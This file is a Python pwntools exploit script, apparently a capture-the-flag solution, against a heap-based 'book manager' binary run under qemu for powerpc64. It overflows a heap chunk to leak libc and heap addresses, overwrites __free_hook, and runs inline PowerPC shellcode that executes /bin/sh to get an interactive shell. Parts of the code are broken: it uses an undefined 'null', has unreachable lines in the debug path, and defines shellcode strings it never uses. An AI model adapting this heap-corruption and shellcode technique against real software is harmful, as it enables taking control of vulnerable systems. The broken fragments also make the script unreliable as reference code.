from pwn import *
import sys

context.log_level = 'debug'
context.endian = 'big'
context.arch='powerpc64'
Debug = sys.argv[1]

elf = ELF('./pwn')
libc = ELF('/usr/powerpc64-linux-gnu/lib/libc-2.31.so')

def get_sh(other_libc=null):
    if Debug == '1':
        return process(["./qemu-ppc64-static","-g","1234","-L","/usr/powerpc64-linux-gnu","./pwn"])
        log.info('Please use GDB remote!(Enter to continue)')
        pause()
        return r
    else:
        return process(["./qemu-ppc64-static","-L","/usr/powerpc64-linux-gnu","./pwn"])

def add(name, sz, ct):
    r.sendlineafter('cmd> ', str(1))
    r.sendlineafter('Book name: ', name)
    r.sendlineafter('Book description size: ', str(sz))
    r.sendafter('Book description: ', ct)

def edit(name, ct):
    r.sendlineafter('cmd> ', str(2))
    r.sendlineafter('Book name: ', name)
    r.sendafter('New book description: ', ct)

def show(name):
    r.sendlineafter('cmd> ', str(3))
    r.sendlineafter('Book name: ', name)

def dele(name):
    r.sendlineafter('cmd> ', str(4))
    r.sendlineafter('Book name: ', name)

r = get_sh()

heap = 0
sc=''

add('1', 0x18, 'G'*0x17+'\n')
add('2', 0x18, 'G'*0x17+'\n')
dele('2')

for i in range(7):
    add('2', 0x10*(i+2)+8, 'G'*(0x10*(i+2)+7)+'\n')
    add('3', 0x10*(i+2)+8, 'G'*(0x10*(i+2)+7)+'\n')
    dele('2')
    dele('3')

for i in range(8):
    edit('1', 'Z'*(0x19+i)+'\n')
pause()
edit('1', 'Z'*0x18+'\x00'*6+'\x04\x41'+'\n')
add('4', 0x18, '1\n')
dele('4')
for i in range(13):
    edit('1', 'Z'*(0x19+i)+'\n')
show('1')
r.recvuntil('Book description: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ')
libc.address = u64('\x00\x00\x00\x40\x00'+r.recv(3))+0x848-libc.sym['__malloc_hook']
for i in range(0x50):
    edit('1', 'Z'*(0x19+13+i)+'\n')
show('1')
r.recvuntil('Book description: ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ')
heap = u64('\x00\x00\x00\x40\x00'+r.recv(3))

binsh = heap+0x4d8

sc1='''
li 3, 0
li 4, 0
li 5, 0
li 0, 11
xor 3,3,9
addi 3,3,36
sc
'''

sc2='''
li 3, 0
li 4, 0
li 5, 0
li 0, 11
addis 3, 4, 8
addi 4, 4, 19
sld 3, 3, 4
li 4, 0
addis 4, 4, {}
addi 3, 3, {}
addi 3, 3, {}+24
add 3, 3, 4
li 4, 0
sc
'''.format((binsh&0xff0000)>>16, (binsh&0xffff)/2, (binsh&0xffff)/2)

sc3='''
li 4, 0
li 5, 0
li 0, 11
li 6, 0
addis 6, 6, 0x2f62
addi 6, 6, 0x696e
stw 6, 0(1)
li 6, 0
addis 6, 6, 0x2f73
addi 6, 6, 0x6800
stw 6, 4(1)
mr 3, 1
sc
'''

edit('1', '\x00'*0x18+p64(0x21)+\
    p64(0)*3+p64(0x31)+\
    p64(0)*5+p64(0x31)+p64(libc.sym['__free_hook'])+'\n')

add('A', 0x88, p64(heap+0x4b0+8)+asm(sc2)+'/bin/sh\x00'+'\n')
dele('1')
add('AA', 0x28, '\n')
add('B', 0x28, p64(heap+0x4b0)+'\n')
dele('A')

# 0x4000020020 booklist

success(hex(len(sc)))
success(hex(libc.address))
success(hex(heap))
r.interactive()